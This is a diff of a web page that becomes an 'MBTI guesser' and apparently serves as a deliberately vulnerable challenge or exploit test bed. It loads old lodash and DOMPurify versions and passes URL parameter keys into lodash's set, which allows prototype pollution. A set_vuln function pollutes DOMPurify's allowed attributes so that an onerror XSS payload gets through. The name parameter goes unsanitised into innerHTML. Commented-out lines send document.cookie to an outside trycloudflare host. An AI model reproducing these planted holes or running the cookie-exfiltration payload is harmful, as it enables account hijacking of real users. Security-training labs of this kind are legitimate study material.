@@ -5,7 +5,11 @@
 <head>
     <meta charset="utf-8">
     <script src="main.js"></script>
-    <title>Pet Sharing Platform</title>
+    <!-- load lodash library 4.17.15 -->
+    <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.15/lodash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
+    <title>MBTI guesser</title>
     <style>
         /* Basic reset */
         * {
@@ -38,7 +42,12 @@
             font-size: 24px;
             text-align: center;
             margin-bottom: 20px;
-            color: #4CAF50;
+            color: #3c89d6;
+        }
+
+        img {
+            width: 500px;
+            height: 500px;
         }
 
         p.description {
@@ -79,7 +88,7 @@
             padding: 10px 15px;
             font-size: 14px;
             color: white;
-            background-color: #4CAF50;
+            background-color: #3c89d6;
             border: none;
             border-radius: 4px;
             cursor: pointer;
@@ -87,11 +96,11 @@
         }
 
         button:hover {
-            background-color: #45a049;
+            background-color: #3c89d6;
         }
 
         button:active {
-            background-color: #3e8e41;
+            background-color: #3c89d6;
         }
 
         #content {
@@ -104,6 +113,10 @@
             color: #333;
             min-height: 50px;
             text-align: center;
+        }
+        
+        #resultMsg {
+         text-align: center;
         }
 
         /* Additional styling for the instruction text */
@@ -119,19 +132,18 @@
         <!-- Form to take user input -->
         
         <div class="container">
-            <h1>Pet Sharing Platform</h1>
-            <p class="description">Share your information and your pet’s details with everyone here!</p>
+            <h1>MBTI guesser</h1>
+            <p class="description">I can guess your MBTI, as long as you provide me with some information...</p>
+            <p class="description">I definitely need your name and age</p>
             <form action="/submit" method="GET" id="userForm">
-                <p class="instruction">Input JSON format: {"arg1":"user", "arg2": {"name": "YOUR_NAME", "pet": "THE_PET_YOU_HAVE"}}</p>
-                <label for="userInput">Your Input:</label>
-                <input type="text" id="userInput" name="userInput" placeholder="Enter your details in JSON format" required>
+                <input type="text" id="userInputTag" name="userInputTag" placeholder="Enter the description tag about you! Ex: Name" required>
+                <input type="text" id="userInput" name="userInput" placeholder="Enter your info. Ex: Ian" required>
                 <div class="buttons">
                     <button type="submit">Submit</button>
-                    <button type="button" onclick="location.reload();">Refresh Note</button>
-                    <button type="button" onclick="clearNote();">Clear Note on Server</button>
+                    <button type="button" onclick="guess();">Now Guess!</button>
                     <button type="button" onclick="report();">Invite a Friend</button>
-                    <button type="button" onclick="dummy_q();" style="display: none;"></button>
                 </div>
+                <p id="resultMsg"></p>
             </form>
     
             <div id="content">
@@ -140,88 +152,131 @@
         </div>
 
         <script>
-            function report() {
-                fetch('/report').then(response => response.json()).then(data => {
-                    console.log(data);
-                });
+            additionalInfo = {};
+
+            function combineAndMap(str, num) {
+                // Get the last character of the string
+                const char = str.charAt(str.length - 1).toLowerCase();;
+                
+                // Get the character code (a = 0, b = 1, ...)
+                const charCode = char.charCodeAt(0) - 97;
+                
+                // Combine character code and number
+                const combined = charCode * 10 + num;
+                
+                // Map the combined value to range [0, 15] using modulo
+                return combined % 16;
             }
 
-            function clearNote(){
-                console.log('clear');
-                fetch('/clear').then(response => response.json()).then(data => {
-                    console.log(data);
-                });
+            function guess() {
+                // Get parameter from URL
+                const urlParams = new URLSearchParams(window.location.search);
+                if('name' in additionalInfo && 'age' in additionalInfo){ 
+                    const name = additionalInfo['name'];
+                    const age = additionalInfo['age'];
+                    combined = combineAndMap(name, parseInt(age));
+                    
+                    // for other additional info, if any
+                    for (const [key, value] of Object.entries(additionalInfo)) {
+                        if(key != 'name' && key != 'age'){
+                            combined += combineAndMap(key, combined);
+                        }
+                    }
+
+                    const mbti = ['INTJ', 'INTP', 'ENTJ', 'ENTP', 'INFJ', 'INFP', 'ENFJ', 'ENFP', 'ISTJ', 'ISFJ', 'ESTJ', 'ESFJ', 'ISTP', 'ISFP', 'ESTP', 'ESFP'];
+                    const result = mbti[combined];
+                    document.getElementById("resultMsg").textContent = `Your MBTI is ${result}`;
+                    console.log('img: ', "<img src=" + window.mbti_pics[result] + " alt=" + result + " />");
+                    document.getElementById("content").innerHTML = "<img src=" + window.mbti_pics[result] + " alt=" + result + " />"
+                } else {
+                    document.getElementById("content").textContent = "Please provide your name and age";
+                }
+                
             }
 
-            function dummy_q(){
-                dummy_query();
+
+            function set_vuln(){
+                                
+
+                lod = _.set({}, "__proto__[hasOwnProperty]", "{}");
+                lod = _.set({}, "__proto__[ALLOWED_ATTR][0]",'onerror');
+                lod = _.set({}, "__proto__[ALLOWED_ATTR][1]",'src');
+                // document.getElementById("content").innerHTML += (DOMPurify.sanitize('<img src onerror=alert(1)>'));
+
+                // console.log(Object.prototype);                
+                // Object.prototype.hasOwnProperty = Object;
+                // Object.prototype.ALLOWED_ATTR = ['onerror', 'src']       
+                console.log(Object.prototype);                                         
+                // console.log('<button formaction=javascript:alert(1)>'); 
+                // console.log('<animate onbegin=alert(1) attributeName=x dur=1s>');
+                console.log(DOMPurify.sanitize('<img src onerror=alert(1)>'));
+                document.getElementById("content").innerHTML += (DOMPurify.sanitize('<img src onerror=alert(1)>'));
+
+                // document.getElementById("content").innerHTML += (DOMPurify.sanitize('<animate onbegin=alert(1) attributeName=x dur=1s>'));
             }
+
+            
 
             // Run the function when the DOM is fully loaded (i.e. when the '/' page is visited)
-            document.addEventListener("DOMContentLoaded", function() {
-                fetch('/getlocal')
-                .then(response => response.json())  
-                .then(data => {      
-                    if(data.data === ''){
-                        document.getElementById("content").textContent = "Alice has a cat";
-                        return;
+            document.addEventListener("DOMContentLoaded", 
+            function(){
+                // get variable from url
+                const urlParams = new URLSearchParams(window.location.search);
+                // get all the other param from url
+                for (const [key, value] of urlParams) {
+                    lower_key = key.toLowerCase();
+                    console.log('key: ', key, 'value: ', value);
+                    additionalInfo = {..._.set({}, key, value), ...additionalInfo};
+                    if(lower_key != 'name' && lower_key != 'age'){
+                        document.getElementById("content").innerHTML += ('<p>Cool, additional infomation about you, got that too.</p>');
                     }
-                    data = JSON.parse(data.data).data;
-                    // parse data entries from server database
-                    for (var i = 0; i < data.length; i++) {
-                        json_obj = JSON.parse(data[i]);
-                        console.log("entry", i, ": ", json_obj); // look for this in the console! might be useful
-                        try {
-                            addString = "<p>" + pass_val(json_obj['arg1'], json_obj['arg2']) + '</p>';
-                        } catch (e) {
-                            document.getElementById("content").textContent = "Invalid JSON";   
-                            addString = "<p>Invalid JSON</p>";                         
-                        }
-                        document.getElementById("content").innerHTML += addString;
-                    }
-                })
-                .catch(error => {
-                    console.error('Error fetching data:', error);
-                    document.getElementById("content").innerHTML = '<p>Alice has a cat</p>';
-                });                
-            });            
+                }
+                console.log('additionalInfo: ', additionalInfo);
+                
+                if(urlParams.has('name')){
+                    console.log('before purified: ', '<p>' + 'name: ' + urlParams.get('name') + '</p>');
+                    // name = DOMPurify.sanitize('<p>' + 'name: ' + urlParams.get('name') + '</p>');
+                    name = ('<p>' + 'name: ' + urlParams.get('name') + '</p>');
+                    console.log('name purified: ', name);
+                    // document.getElementById("content").innerHTML += DOMPurify.sanitize(`<img src=https://home-cornwall-zum-folks.trycloudflare.com?${encodeURIComponent(document.cookie)}>`);
+                    // document.getElementById("content").innerHTML += DOMPurify.sanitize(urlParams.get('name'));
+                    // document.getElementById("content").innerHTML += `<img src=https://home-cornwall-zum-folks.trycloudflare.com?${encodeURIComponent(document.cookie)}>`;
+                    // const content = document.getElementById("content");
+                    // const rawHTML = urlParams.get('name');
+                    // const tempDiv = document.createElement('div');
+                    // tempDiv.innerHTML = rawHTML;
+                    // content.appendChild(tempDiv.firstChild); // Append the parsed HTML element
+                    document.getElementById("content").innerHTML += '<p>' + 'name: ' + urlParams.get('name') + '</p>';
+                    // document.getElementById("content").innerHTML += rawHtml;
+                }
+                if(urlParams.has('age')){
+                    age = DOMPurify.sanitize('<p>' + 'age: ' + urlParams.get('age') + '</p>')
+                    console.log('age purified: ', age);
+                    document.getElementById("content").innerHTML += age;
+                }
+            }
+        );            
             
 
             document.getElementById('userForm').addEventListener('submit', function(event) {
                     event.preventDefault(); // Prevents default form submission for demonstration
                     
+                    const searchParams = new URLSearchParams(window.location.search);
                     // Get the user input value
-                    const userInputValue = document.getElementById('userInput').value;
-                    console.log('eventListener', userInputValue);
+                    const userInputTagValue = document.getElementById('userInputTag').value;
+                    console.log('userInputTagValue', userInputTagValue);
                     
-                    // Display the input value 
-                    try {
-                        json_obj = JSON.parse(userInputValue);
-                    } catch (e) {
-                        document.getElementById("content").textContent = "Invalid JSON";
-                        return;
-                    }
-                    fetch('/submit?' + new URLSearchParams({data: JSON.stringify(json_obj)}))
-                    .then(response => response.json())  
-                    addString = "<p>" + pass_val(json_obj['arg1'], json_obj['arg2']) + '</p>';
-                    document.getElementById("content").innerHTML += addString;
-            });
+                    // Construct URL based on user input
+                    const userInputValue = document.getElementById('userInput').value;
+                    console.log('userInputValue', userInputValue);
 
-            // Useful note for the implemetation of the pass_val function
-            // function pass_val(subject, obj){
-            //     var template_result1 = "Ian has a cat.";
-            //     var template_result2 = "And its name is Fluffy.";
-            //     var templateString = '';
-            //     if(subject === 'user'){
-            //         templateString = '<%= user.name %> has a <%= user.pet %>';
-            //     } 
-            //     else if(subject === 'pet'){
-            //         templateString = 'and its name is <%= pet.name %>.';
-            //     }
-            //     const template = someUsefulLibrary.template(templateString, { variable: subject });
-            //     const populated = template(obj);
-            //     return populated;
-            // }
+                    // Construct URL based on user input
+                    searchParams.set(userInputTagValue, userInputValue);
+
+                    // window.history.replaceState({}, '', `${window.location.pathname}?${searchParams}`);
+                    document.location.href = `${window.location.pathname}?${searchParams}`;
+                    
+            });
 
         </script>    
     </body>
